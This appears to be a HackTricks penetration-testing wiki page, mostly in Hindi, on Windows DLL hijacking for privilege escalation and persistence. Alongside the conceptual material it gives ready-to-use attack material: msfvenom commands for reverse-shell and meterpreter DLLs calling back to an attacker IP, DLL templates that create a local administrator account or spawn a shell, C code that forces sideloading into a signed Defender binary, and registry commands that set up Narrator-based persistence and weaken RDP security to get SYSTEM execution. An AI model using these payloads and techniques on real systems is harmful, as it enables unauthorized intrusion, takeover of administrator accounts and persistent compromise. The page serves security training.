# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## बुनियादी जानकारी

DLL Hijacking एक विश्वसनीय एप्लिकेशन को दुर्भावनापूर्ण DLL लोड कराने के लिए मैनीपुलेट करने से सम्बंधित है। यह शब्द कई रणनीतियों को शामिल करता है जैसे **DLL Spoofing, Injection, and Side-Loading**. यह मुख्य रूप से code execution, persistence हासिल करने, और कम सामान्य रूप से privilege escalation के लिए उपयोग होता है। हालाँकि यहाँ privilege escalation पर फोकस है, hijacking की विधि उद्देश्य के अनुसार सामान्यत: समान रहती है।

### सामान्य तकनीकें

DLL hijacking के लिए कई तरीके उपयोग में लाए जाते हैं, और प्रत्येक की प्रभावशीलता उस application's DLL लोडिंग रणनीति पर निर्भर करती है:

1. **DLL Replacement**: एक वास्तविक DLL को दुर्भावनापूर्ण DLL से बदलना, वैकल्पिक रूप से original DLL की कार्यक्षमता बनाए रखने के लिए DLL Proxying का उपयोग करना।
2. **DLL Search Order Hijacking**: दुर्भावनापूर्ण DLL को वैध वाले से पहले आने वाले search path में रखना, application's search pattern का फायदा उठाते हुए।
3. **Phantom DLL Hijacking**: ऐसा malicious DLL बनाना जिसे application लोड करे क्योंकि उसे यह किसी आवश्यक लेकिन मौजूद नहीं वाले DLL जैसा लगता है।
4. **DLL Redirection**: खोज पैरामीटर जैसे `%PATH%` या `.exe.manifest` / `.exe.local` फाइलों को संशोधित करके application को malicious DLL की ओर निर्देशित करना।
5. **WinSxS DLL Replacement**: WinSxS निर्देशिका में वैध DLL को malicious संस्करण से बदलना — यह विधि अक्सर DLL side-loading से जुड़ी होती है।
6. **Relative Path DLL Hijacking**: कॉपी की गई application के साथ user-controlled डायरेक्टरी में malicious DLL रखना, जो Binary Proxy Execution तकनीकों जैसा व्यवहार दिखाता है।

> [!TIP]
> HTML staging, AES-CTR configs, और .NET implants को DLL sideloading के ऊपर layer करने वाली चरण-दर-चरण श्रृंखला के लिए नीचे दिया गया workflow देखें।

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## गायब DLLs खोजना

सिस्टम के भीतर गायब DLLs खोजने का सबसे सामान्य तरीका sysinternals का [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) चलाना है, और **निम्न 2 फ़िल्टर** सेट करना:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

और बस **File System Activity** दिखाइए:

![](<../../../images/image (153).png>)

यदि आप सामान्य रूप से **missing dlls** ढूँढ रहे हैं तो इसे कुछ **सेकंड** चलने दें।\
यदि आप किसी विशिष्ट executable के भीतर **missing dll** ढूँढ रहे हैं तो आपको एक अतिरिक्त फ़िल्टर सेट करना चाहिए जैसे "Process Name" "contains" `<exec name>`, उसे execute करें, और events capture करना बंद कर दें।

## गायब DLLs का शोषण

privilege escalate करने के लिए हमारी सबसे अच्छी संभावना यह है कि हम ऐसा DLL लिख सकें जिसे कोई privileged process लोड करने की कोशिश करेगा और वह DLL किसी ऐसे स्थान पर लिखा जा सके जहाँ loader पहले खोज करेगा। इसलिए, या तो हम एक DLL उस फ़ोल्डर में लिख सकेंगे जहाँ वह DLL वैध DLL की फ़ोल्डर से पहले खोजा जाता है (अजीब मामला), या हम किसी ऐसे फ़ोल्डर में लिख पाएंगे जहाँ DLL खोजा जाएगा और original DLL किसी भी फ़ोल्डर में मौजूद नहीं होगा।

### Dll Search Order

**Microsoft documentation** में आप देख सकते हैं कि Dlls कैसे विशेष रूप से लोड होते हैं।

Windows applications predefined search paths के अनुक्रम का पालन करके DLLs की तलाश करते हैं। DLL hijacking तब उत्पन्न होता है जब एक हानिकारक DLL रणनीतिक रूप से उन डायरेक्टरीज़ में से किसी एक में रखा जाता है ताकि वह authentic DLL से पहले लोड हो जाए। इससे बचने का एक उपाय है कि एप्लिकेशन DLLs का संदर्भ देने के लिए absolute paths का उपयोग करे।

नीचे आप 32-bit सिस्टम्स पर **DLL search order** देख सकते हैं:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

यह **default** search order है जब **SafeDllSearchMode** enabled हो। जब यह disabled होता है तो current directory दूसरी जगह आ जाती है। इस feature को disable करने के लिए **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value बनाकर इसे 0 पर सेट करें (default enabled है)।

यदि [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) function को **LOAD_WITH_ALTERED_SEARCH_PATH** के साथ कॉल किया जाता है तो search उस executable module की डायरेक्टरी से शुरू होगी जिसे **LoadLibraryEx** लोड कर रहा है।

अंत में, ध्यान दें कि कभी-कभी किसी dll को केवल नाम के बजाय उसके absolute path के साथ लोड किया जा सकता है। उस स्थिति में वह dll केवल उसी path में खोजा जाएगा (यदि उस dll की कोई dependencies हैं, तो उन dependencies को नाम से लोड किए जाने पर ही खोजा जाएगा)।

search order बदलने के और भी तरीके हैं पर मैं उन्हें यहाँ विस्तार से नहीं बताऊंगा।

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

An advanced way to deterministically influence the DLL search path of a newly created process is to set the DllPath field in RTL_USER_PROCESS_PARAMETERS when creating the process with ntdll’s native APIs. By supplying an attacker-controlled directory here, a target process that resolves an imported DLL by name (no absolute path and not using the safe loading flags) can be forced to load a malicious DLL from that directory.

मुख्य विचार
- RtlCreateProcessParametersEx से process parameters बनाएं और एक custom DllPath दें जो आपके नियंत्रित फ़ोल्डर की ओर इशारा करे (उदा., वह डायरेक्टरी जहाँ आपका dropper/unpacker मौजूद है)।
- RtlCreateUserProcess से process बनाएं। जब target binary किसी DLL को नाम से resolve करेगा, तो loader resolution के दौरान इस दिए गए DllPath को देखेगा, जिससे विश्वसनीय sideloading संभव होगा भले ही malicious DLL target EXE के साथ colocated न हो।

नोट्स/सीमाएँ
- यह उस child process को प्रभावित करता है जो बनाया जा रहा है; यह SetDllDirectory से अलग है, जो केवल current process को प्रभावित करता है।
- target को किसी DLL को नाम से import या LoadLibrary करना चाहिए (कोई absolute path नहीं और LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories का उपयोग नहीं कर रहा)।
- KnownDLLs और hardcoded absolute paths को hijack नहीं किया जा सकता। Forwarded exports और SxS precedence बदल सकते हैं।

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

ऑपरेशनल उपयोग उदाहरण
- अपने DllPath डायरेक्टरी में एक malicious xmllite.dll रखें (जो आवश्यक functions एक्सपोर्ट करता हो या असली DLL को proxy करता हो).
- ऊपर बताए गए तरीके का उपयोग करते हुए उस signed binary को लॉन्च करें जो नाम से xmllite.dll को लुकअप करने के लिए जाना जाता है। loader सप्लाई किए गए DllPath के माध्यम से import को resolve करता है और आपका DLL sideloads कर लेता है।

इस technique को in-the-wild देखा गया है कि यह multi-stage sideloading chains को चलाती है: एक प्रारम्भिक launcher एक helper DLL डालता है, जो फिर एक Microsoft-signed, hijackable binary को spawn करता है जिसके पास एक custom DllPath होता है ताकि attacker’s DLL को staging directory से लोड करने के लिए मजबूर किया जा सके।


#### Windows docs से DLL खोज क्रम के अपवाद

मानक DLL खोज क्रम के कुछ अपवाद Windows दस्तावेज़ में नोट किए गए हैं:

- जब एक **DLL that shares its name with one already loaded in memory** मिलती है, तो सिस्टम सामान्य खोज को बायपास कर देता है। इसके बजाय, यह redirection और एक manifest की जाँच करता है और फिर पहले से memory में मौजूद DLL पर डिफ़ॉल्ट करता है। **ऐसी स्थिति में सिस्टम DLL की खोज नहीं करता है**।
- उन मामलों में जहाँ DLL को वर्तमान Windows संस्करण के लिए एक **known DLL** के रूप में पहचान लिया जाता है, सिस्टम अपने version के known DLL का उपयोग करेगा, साथ ही उसकी किसी भी dependent DLLs के साथ, **खोज प्रक्रिया को त्यागते हुए**। रजिस्ट्री की कुंजी **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** इन known DLLs की सूची रखती है।
- यदि किसी **DLL के dependencies** हों, तो इन dependent DLLs की खोज इस तरह की जाती है जैसे कि वे केवल उनके **module names** द्वारा इंगित किए गए हों, चाहे प्रारंभिक DLL को full path के माध्यम से पहचाना गया हो या नहीं।

### Escalating Privileges

**आवश्यकताएँ**:

- ऐसे process की पहचान करें जो **विभिन्न अधिकारों** (horizontal or lateral movement) के तहत चलता है या चलेगा, और जो **DLL से वंचित** हो।
- सुनिश्चित करें कि जिस भी **डायरेक्टरी** में **DLL** की **खोज** की जाएगी वहाँ आपके पास **लिखने की अनुमति** उपलब्ध हो। यह स्थान executable की डायरेक्टरी या system path के भीतर किसी डायरेक्टरी में हो सकता है।

हाँ, आवश्यकताएँ ढूँढना जटिल है क्योंकि **डिफ़ॉल्ट रूप से किसी privileged executable में DLL का गायब होना अजीब है** और इसके साथ ही **system path फ़ोल्डर पर write permissions होना और भी अजीब है** (आपके पास डिफ़ॉल्ट रूप से नहीं होते)। लेकिन misconfigured environments में यह संभव है.\
यदि आप भाग्यशाली हैं और आप आवश्यकताओं को पूरा करते हुए स्थिति पाते हैं, तो आप [UACME](https://github.com/hfiref0x/UACME) प्रोजेक्ट चेक कर सकते हैं। भले ही प्रोजेक्ट का **main goal of the project is bypass UAC** हो, आपको वहाँ उस Windows संस्करण के लिए Dll hijacking का एक **PoC** मिल सकता है जिसे आप उपयोग कर सकते हैं (संभावित रूप से बस उस फ़ोल्डर के path को बदलकर जहाँ आपके पास write permissions हैं)।

ध्यान दें कि आप किसी फ़ोल्डर में अपनी **permissions जांच** कर सकते हैं इस तरह:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
और **PATH के अंदर सभी फ़ोल्डरों की permissions की जाँच करें**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
आप किसी executable के imports और किसी dll के exports को भी निम्न के साथ चेक कर सकते हैं:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
यदि आपके पास किसी **System Path folder** में लिखने की अनुमति है तो **Dll Hijacking का दुरुपयोग कर privileges escalate करना** के बारे में पूरी गाइड देखें:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) यह जांचेगा कि क्या आपके पास system PATH के किसी भी फ़ोल्डर में लिखने की अनुमति है।\
इस vulnerability का पता लगाने के लिए अन्य उपयोगी automated tools **PowerSploit functions** हैं: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ और _Write-HijackDll_।

### Example

यदि आप कोई exploitable scenario पाते हैं तो इसे सफलतापूर्वक exploit करने के लिए सबसे महत्वपूर्ण चीजों में से एक यह होगा कि आप **ऐसी dll बनाएं जो कम से कम उन सभी functions को export करे जिन्हें executable उससे import करेगा**। वैसे भी, ध्यान दें कि Dll Hijacking उपयोगी होता है [Medium Integrity level से High **(bypassing UAC)** तक escalate करने के लिए](../../authentication-credentials-uac-and-efs/index.html#uac) या [**High Integrity से SYSTEM तक**](../index.html#from-high-integrity-to-system)**.** आप execution के लिए इस dll hijacking अध्ययन में **एक वैध dll कैसे बनाएं** का एक उदाहरण पा सकते हैं: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Moreover, in the **next sectio**n you can find some **बुनियादी dll codes** that might be useful as **टेम्पलेट्स** or to create a **dll with non required functions exported**.

## **Dlls बनाना और संकलित करना**

### **Dll Proxifying**

बुनियादी तौर पर एक **Dll proxy** वह Dll होता है जो लोड होने पर आपका **malicious code execute** कर सके, और साथ ही अपेक्षित तरीके से **expose** और **work** करे by **relaying all the calls to the real library**।

With the tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) or [**Spartacus**](https://github.com/Accenture/Spartacus) you can actually **indicate an executable and select the library** you want to proxify and **generate a proxified dll** or **indicate the Dll** and **generate a proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**एक meterpreter (x86) प्राप्त करें:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**एक user बनाएं (x86 मैंने x64 वर्ज़न नहीं देखा):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### अपना

ध्यान दें कि कई मामलों में वह Dll जिसे आप compile करते हैं, उसे **export several functions** करने होंगे जिन्हें victim process द्वारा load किया जाएगा; अगर ये functions मौजूद नहीं हैं तो **binary won't be able to load** them और **exploit will fail**।

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL उदाहरण उपयोगकर्ता निर्माण के साथ</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>वैकल्पिक C DLL थ्रेड एंट्री के साथ</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## केस स्टडी: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe स्टार्ट पर एक पूर्वानुमेय, भाषा-विशिष्ट localization DLL को प्रोब करता है जो arbitrary code execution और persistence के लिए hijack किया जा सकता है।

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- यदि OneCore पथ पर writable attacker-controlled DLL मौजूद है, तो यह लोड हो जाता है और `DllMain(DLL_PROCESS_ATTACH)` execute होता है। किसी भी exports की आवश्यकता नहीं है।

Discovery with Procmon
- फ़िल्टर: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Narrator शुरू करें और ऊपर बताए गए पथ के लोड के प्रयास को देखें।

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- एक साधारण hijack UI को बोलने/हाइलाइट करने का कारण बनेगा। चुप रहने के लिए, attach करते समय Narrator के थ्रेड्स को enumerate करें, main thread को खोलें (`OpenThread(THREAD_SUSPEND_RESUME)`) और उसे `SuspendThread` करें; अपनी खुद की थ्रेड में जारी रखें। पूर्ण कोड के लिए PoC देखें।

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- उपरोक्त के साथ, Narrator शुरू करने पर planted DLL लोड हो जाएगा। secure desktop (logon screen) पर Narrator शुरू करने के लिए CTRL+WIN+ENTER दबाएँ।

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- होस्ट पर RDP करें, logon screen पर Narrator लॉन्च करने के लिए CTRL+WIN+ENTER दबाएँ; आपका DLL secure desktop पर SYSTEM के रूप में execute होगा।
- Execution तब रुकता है जब RDP सेशन बंद होता है — जल्दी से inject/migrate करें।

Bring Your Own Accessibility (BYOA)
- आप एक built-in Accessibility Tool (AT) registry entry (उदा., CursorIndicator) को clone कर सकते हैं, उसे किसी arbitrary binary/DLL की ओर इंगित करने के लिए edit करें, import करें, फिर `configuration` को उस AT नाम पर सेट करें। यह Accessibility framework के तहत arbitrary execution को proxy करता है।

Notes
- `%windir%\System32` में लिखने और HKLM मान बदलने के लिए admin अधिकार आवश्यक हैं।
- सभी payload लॉजिक `DLL_PROCESS_ATTACH` में रह सकती है; किसी exports की आवश्यकता नहीं है।

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

यह केस Lenovo के TrackPoint Quick Menu (`TPQMAssistant.exe`) में Phantom DLL Hijacking को दर्शाता है, जिसका ट्रैक CVE-2025-1729 है।

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` स्थित है `C:\ProgramData\Lenovo\TPQM\Assistant\` में।
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` रोज़ाना सुबह 9:30 बजे लॉग-ऑन यूज़र के context में चलता है।
- **Directory Permissions**: `CREATOR OWNER` द्वारा writable है, जिससे local users arbitrary files ड्रॉप कर सकते हैं।
- **DLL Search Behavior**: यह पहले अपने working directory से `hostfxr.dll` लोड करने का प्रयास करता है और यदि गायब हो तो "NAME NOT FOUND" लॉग करता है, जो local directory खोज की प्राथमिकता को दर्शाता है।

### Exploit Implementation

एक attacker उसी directory में malicious `hostfxr.dll` stub रख सकता है, मिसिंग DLL का फायदा उठाकर यूज़र के context में code execution हासिल करने के लिए:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### हमला प्रवाह

1. एक सामान्य उपयोगकर्ता के रूप में, `hostfxr.dll` को `C:\ProgramData\Lenovo\TPQM\Assistant\` में डालें।
2. वर्तमान उपयोगकर्ता के संदर्भ में शेड्यूल किए गए कार्य के सुबह 9:30 बजे चलने का इंतजार करें।
3. यदि कार्य निष्पादित होने पर कोई administrator लॉग इन है, तो दुर्भावनापूर्ण DLL administrator के सत्र में medium integrity पर चलता है।
4. standard UAC bypass techniques की श्रृंखला का उपयोग करके medium integrity से SYSTEM privileges तक बढ़ाएँ।

## केस स्टडी: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

अक्रमणकारी अक्सर MSI-आधारित droppers को DLL side-loading के साथ जोड़ते हैं ताकि भरोसेमंद, signed process के तहत payloads निष्पादित किए जा सकें।

चेन अवलोकन
- उपयोगकर्ता MSI डाउनलोड करता है। GUI install के दौरान एक CustomAction शांत रूप से चलता है (उदा., LaunchApplication या एक VBScript action), और embedded resources से अगले चरण का पुनर्निर्माण करता है।
- Dropper उसी डायरेक्टरी में एक वैध, signed EXE और एक malicious DLL लिखता है (उदाहरण जोड़: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll)।
- जब signed EXE शुरू किया जाता है, Windows DLL search order working directory से पहले wsc.dll लोड करता है, जिससे attacker code signed parent के तहत निष्पादित होता है (ATT&CK T1574.001)।

MSI analysis (what to look for)
- CustomAction table:
- ऐसे एंट्रीज़ खोजें जो executables या VBScript चलाती हों। संदिग्ध पैटर्न का उदाहरण: LaunchApplication जो background में एक embedded file चलाता है।
- Orca (Microsoft Orca.exe) में, CustomAction, InstallExecuteSequence और Binary tables की जांच करें।
- MSI CAB में embedded/split payloads:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- या lessmsi का उपयोग करें: lessmsi x package.msi C:\out
- ऐसी कई छोटी टुकड़े खोजें जिन्हें VBScript CustomAction द्वारा जोड़कर और decrypt किया जाता है। सामान्य प्रवाह:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
wsc_proxy.exe के साथ व्यावहारिक sideloading
- इन दोनों फाइलों को एक ही फ़ोल्डर में रखें:
- wsc_proxy.exe: legitimate signed host (Avast). यह process अपने directory से नाम द्वारा wsc.dll को load करने का प्रयास करता है।
- wsc.dll: attacker DLL. अगर किसी विशेष exports की आवश्यकता नहीं है, तो DllMain पर्याप्त हो सकता है; अन्यथा, proxy DLL बनाकर आवश्यक exports को genuine library में forward करें जबकि DllMain में payload चल रहा हो।
- एक न्यूनतम DLL payload बनाएं:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- निर्यात आवश्यकताओं के लिए, एक proxying framework (e.g., DLLirant/Spartacus) का उपयोग करें ताकि एक forwarding DLL जनरेट हो जो आपका payload भी निष्पादित करे।

- यह तकनीक host binary द्वारा DLL नाम समाधान पर निर्भर करती है। यदि host absolute paths या safe loading flags (e.g., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories) का उपयोग करता है, तो hijack असफल हो सकता है।
- KnownDLLs, SxS, and forwarded exports precedence को प्रभावित कर सकते हैं और इन्हें host binary और export set के चयन के दौरान ध्यान में रखना चाहिए।

## References

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)


{{#include ../../../banners/hacktricks-training.md}}
